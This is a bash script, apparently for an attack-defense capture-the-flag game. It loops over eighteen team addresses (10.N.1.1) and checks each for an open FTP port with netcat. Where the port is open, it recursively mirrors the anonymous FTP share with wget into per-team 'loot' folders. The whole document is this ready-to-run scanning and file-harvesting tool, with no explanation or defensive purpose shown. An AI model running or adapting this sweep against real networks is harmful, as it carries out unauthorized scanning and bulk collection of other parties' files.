#!/bin/bash

for i in {1..18}; do
  # Absolute path for loot directory
  LOOT_DIR="$HOME/loot/team$i"
  mkdir -p "$LOOT_DIR"
  ip="10.$i.1.1"  # FIXED: No spaces in variable assignment

  echo -e "\n[🔍] Checking FTP on $ip...\n"

  # Check if FTP port is open
  if nc -zv -w 2 "$ip" 21 &>/dev/null; then
    echo -e "[📡] FTP service active on $ip\n"

    # Create directory for this IP
    IP_DIR="$LOOT_DIR/$ip"
    mkdir -p "$IP_DIR"

    if [ -d "$IP_DIR" ]; then
      # Download files recursively using wget (anonymous FTP)
      wget -q -m --ftp-user=anonymous --ftp-password="" "ftp://$ip/" -P "$IP_DIR" 2>/dev/null

      # Check if files were downloaded
      if [ "$(ls -A "$IP_DIR")" ]; then
        echo -e "[✅] Successfully downloaded files from $ip to:\n     $IP_DIR\n"
      else
        echo -e "[⚠️] No files found on $ip. Directory remains empty.\n"
      fi
    else
      echo -e "[❌] ERROR: Failed to create directory $IP_DIR. Skipping download.\n"
    fi
  else
    echo -e "[🚫] FTP port closed or unreachable on $ip. Skipping...\n"
  fi
done  # FIXED: Removed extra "done"

echo -e "\n[🎉] Script execution complete. Check $HOME/loot/ for results!\n"
